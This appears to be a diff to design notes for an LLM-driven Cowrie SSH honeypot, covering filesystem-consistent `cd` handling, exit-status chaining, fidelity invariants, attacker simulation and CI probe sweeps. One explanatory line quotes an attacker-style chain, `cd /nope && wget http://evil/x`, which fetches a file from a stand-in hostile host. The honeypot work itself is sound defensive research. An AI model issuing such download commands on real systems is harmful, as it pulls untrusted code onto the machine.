@@ -263,6 +263,19 @@ registry rather than naming providers.
   round-trip. `exit` actually exits (or pops an su subshell), `cd` updates
   `self.cwd` so the next LLM turn sees consistent state. Cuts per-session
   latency and cost.
+- **`cd` can fail.** It is checked against the VFS — the same model `ls`
+  and `stat` render from — so `cd /etc/apache2` is refused whenever
+  `ls /etc` does not list it, and the three commands cannot contradict
+  each other. Paths whose *parent* we never modelled are still accepted:
+  saying nothing about a directory we never described is not a
+  contradiction, but claiming it is absent would be. This also restores
+  the chain semantics — a `cd` that could not fail made
+  `cd /nope && wget http://evil/x` always fetch and `cd /nope || cd /tmp`
+  never fall back.
+- **Exit status drives `&&` / `||`.** `ResponderResult.exit_code` is
+  separate from `is_error`, which answers a different question — "is this
+  text stderr", used to make the pipeline path decline. They correlate but
+  are not the same axis.
 - **LLM-turn logging.** Every command emits `cowrie.llm.prompt` and
   `cowrie.llm.response` events to the JSON log with `latency_ms`. Errors
   log `cowrie.llm.error`. All carry the session id so they correlate with
@@ -345,7 +358,7 @@ deferral of anything not modeled.
 deterministic responder on the two believability axes the honeypot
 literature uses, and doubles as a CI regression gate:
 
-- **Consistency** — 19 cross-command / against-persona invariants that
+- **Consistency** — 33 cross-command / against-persona invariants that
   must hold (`uname -r` ⊂ `uname -a`, `nproc` == `/proc/cpuinfo` block
   count, `id www-data` == `/etc/passwd` uid 33, `hostname` ==
   `/etc/hostname`, `free` total == `/proc/meminfo` MemTotal, `/proc/meminfo`
@@ -372,7 +385,7 @@ PYTHONPATH=src python scripts/fidelity_eval.py --reference local
 The Twisted glue files (`avatar.py`, `realm.py`, `server.py`,
 `session.py`, `telnet.py`) are at 0% in trial — they're integration
 points with the SSH channel layer and tested live via
-`scripts/attacker_sim.py` which exercises 6 realistic attacker patterns
+`scripts/attacker_sim.py` which exercises 8 synthetic attacker patterns
 end-to-end. The 80% trial-coverage target the v1 plan called for is
 unreachable for these files without standing up a fake SSH transport.
 
@@ -494,7 +507,9 @@ week's most valuable fix, and now gates against that regressing.
   locally, so the failure mode is "narrated" rather than "wrong".
 - **`scripts/probe_search.py` proves presence, not absence.** It searches
   for the shortest command sequence that exposes the honeypot, offline and
-  deterministically, and gates CI across all 96 behaviour configurations.
+  deterministically. CI gates the **depth-1** sweep across all 96 behaviour
+  configurations (~3.5 min); the depth-2 sweep is minutes-to-tens-of-minutes
+  and is run manually or on a schedule, not per-push.
   A clean run means no detector exists *within its hand-written probe
   alphabet at that depth* — the alphabet inherits our blind spots, exactly
   as `routing_report` inherited the fastpath's. It also cannot see timing:
